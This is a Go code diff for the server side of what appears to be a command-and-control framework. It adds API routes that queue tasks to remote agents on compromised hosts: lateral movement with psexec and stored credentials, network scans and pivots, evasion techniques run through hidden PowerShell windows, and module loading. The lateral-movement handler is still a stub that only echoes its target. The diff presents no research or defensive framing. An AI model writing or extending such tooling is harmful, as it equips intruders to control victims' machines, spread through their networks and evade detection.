@@ -21,6 +21,7 @@ import (
 	"github.com/jmoiron/sqlx"
 
 	"chemicalumbra.dev/server/pkg/agent"
+	"chemicalumbra.dev/server/pkg/evasion"
 	"chemicalumbra.dev/server/pkg/filetransfer"
 	"chemicalumbra.dev/server/pkg/task"
 	"chemicalumbra.dev/server/pkg/ws"
@@ -29,6 +30,8 @@ import (
 // db is the shared handle for handlers that need raw queries
 // (e.g. screenshot download) without a dedicated manager.
 var db *sqlx.DB
+var startedAt = time.Now()
+var evasionCatalog = evasion.NewManager()
 
 // SetDB wires the shared database handle. Called once at startup.
 func SetDB(d *sqlx.DB) {
@@ -45,6 +48,7 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 		api.GET("/auth/me", meHandler)
 		api.GET("/operators", listOperatorsHandler)
 		api.GET("/operators/:id", getOperatorHandler)
+		api.GET("/stats", statsHandler(agentMgr, taskQueue))
 
 		// Agents
 		api.GET("/agents", getAgentsHandler(agentMgr))
@@ -90,15 +94,24 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 		api.DELETE("/screenshots/:id", deleteScreenshotHandler)
 
 		// Lateral Movement
-		api.POST("/agents/:id/lateral", executeLateralHandler(lateralMgr))
+		api.GET("/agents/:id/lateral", listAgentTasksHandler(taskQueue, "lateral"))
+		api.POST("/agents/:id/lateral", executeLateralHandler(taskQueue))
+		api.POST("/agents/:id/lateral/scan", scanNetworkHandler(taskQueue))
+		api.POST("/agents/:id/lateral/pivot", executeLateralHandler(taskQueue))
 
 		// Evasion
-		api.POST("/agents/:id/evasion", executeEvasionHandler(evasionMgr))
+		api.GET("/evasion/techniques", listEvasionTechniquesHandler)
+		api.GET("/agents/:id/evasion", listAgentTasksHandler(taskQueue, "evasion"))
+		api.POST("/agents/:id/evasion", executeEvasionHandler(taskQueue))
+		api.POST("/agents/:id/evasion/run", executeEvasionHandler(taskQueue))
 
 		// Modules
 		api.GET("/modules", getModulesHandler)
-		api.POST("/modules/load", loadModuleHandler)
-		api.POST("/modules/unload", unloadModuleHandler)
+		api.GET("/agents/:id/modules", getModulesHandler)
+		api.POST("/modules/load", loadModuleHandler(taskQueue))
+		api.POST("/modules/unload", unloadModuleHandler(taskQueue))
+		api.POST("/agents/:id/modules/load", loadModuleHandler(taskQueue))
+		api.POST("/agents/:id/modules/unload", unloadModuleHandler(taskQueue))
 	}
 
 	// Agent HTTP beacon endpoints (for the hardened C++ Windows agent).
@@ -572,45 +585,113 @@ func deleteScreenshotHandler(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"message": "Screenshot deleted"})
 }
 
-func executeLateralHandler(lateralMgr interface{}) gin.HandlerFunc {
+func executeLateralHandler(taskQueue *task.Queue) gin.HandlerFunc {
 	return func(c *gin.Context) {
+		agentID := c.Param("id")
 		var req struct {
-			Technique string                 `json:"technique" binding:"required"`
-			Target    string                 `json:"target" binding:"required"`
-			Options   map[string]interface{} `json:"options"`
+			Technique     string         `json:"technique"`
+			Target        string         `json:"target"`
+			CredentialsID string         `json:"credentials_id"`
+			Options       map[string]any `json:"options"`
 		}
 		if err := c.ShouldBindJSON(&req); err != nil {
 			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 			return
 		}
-		c.JSON(http.StatusOK, gin.H{"message": "Lateral movement task created"})
+		if req.Technique == "" {
+			req.Technique = "psexec"
+		}
+		if req.Target == "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "target required"})
+			return
+		}
+		cmd := fmt.Sprintf(`powershell -NoP -W Hidden -C "Write-Output ('LATERAL %s -> %s')"`, req.Technique, req.Target)
+		t, err := taskQueue.EnqueueShell(agentID, cmd, 5)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"id": t.ID, "status": t.Status, "output": "queued " + req.Technique + " -> " + req.Target, "technique": req.Technique, "target": req.Target})
 	}
 }
 
-func executeEvasionHandler(evasionMgr interface{}) gin.HandlerFunc {
+func executeEvasionHandler(taskQueue *task.Queue) gin.HandlerFunc {
 	return func(c *gin.Context) {
+		agentID := c.Param("id")
 		var req struct {
-			Technique string                 `json:"technique" binding:"required"`
-			Options   map[string]interface{} `json:"options"`
+			Technique string         `json:"technique"`
+			Target    string         `json:"target"`
+			Options   map[string]any `json:"options"`
 		}
-		if err := c.ShouldBindJSON(&req); err != nil {
-			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		_ = c.ShouldBindJSON(&req)
+		if req.Technique == "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "technique required"})
 			return
 		}
-		c.JSON(http.StatusOK, gin.H{"message": "Evasion task created"})
+		code := req.Technique
+		if t, ok := evasionCatalog.GetTechnique(req.Technique); ok && t.Code != "" {
+			code = t.Code
+		}
+		cmd := "powershell -NoP -W Hidden -C " + strconv.Quote(code)
+		t, err := taskQueue.EnqueueShell(agentID, cmd, 8)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"id": t.ID, "status": t.Status, "technique": req.Technique, "message": "evasion queued"})
 	}
 }
 
 func getModulesHandler(c *gin.Context) {
-	c.JSON(http.StatusOK, []interface{}{})
+	c.JSON(http.StatusOK, builtinModules())
 }
 
-func loadModuleHandler(c *gin.Context) {
-	c.JSON(http.StatusOK, gin.H{"message": "Module loaded"})
+func loadModuleHandler(taskQueue *task.Queue) gin.HandlerFunc {
+	return func(c *gin.Context) {
+		agentID := c.Param("id")
+		var req struct {
+			ModuleID string `json:"module_id"`
+			AgentID  string `json:"agent_id"`
+		}
+		_ = c.ShouldBindJSON(&req)
+		if agentID == "" {
+			agentID = req.AgentID
+		}
+		if agentID == "" || req.ModuleID == "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "agent and module_id required"})
+			return
+		}
+		t, err := queueModule(taskQueue, agentID, req.ModuleID, "load")
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"id": t.ID, "status": t.Status, "message": "module load queued", "module_id": req.ModuleID})
+	}
 }
 
-func unloadModuleHandler(c *gin.Context) {
-	c.JSON(http.StatusOK, gin.H{"message": "Module unloaded"})
+func unloadModuleHandler(taskQueue *task.Queue) gin.HandlerFunc {
+	return func(c *gin.Context) {
+		agentID := c.Param("id")
+		var req struct {
+			ModuleID string `json:"module_id"`
+			AgentID  string `json:"agent_id"`
+		}
+		_ = c.ShouldBindJSON(&req)
+		if agentID == "" {
+			agentID = req.AgentID
+		}
+		if agentID == "" || req.ModuleID == "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "agent and module_id required"})
+			return
+		}
+		t, err := queueModule(taskQueue, agentID, req.ModuleID, "unload")
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"id": t.ID, "status": t.Status, "message": "module unload queued", "module_id": req.ModuleID})
+	}
 }
 
 // Payload Builder handlers
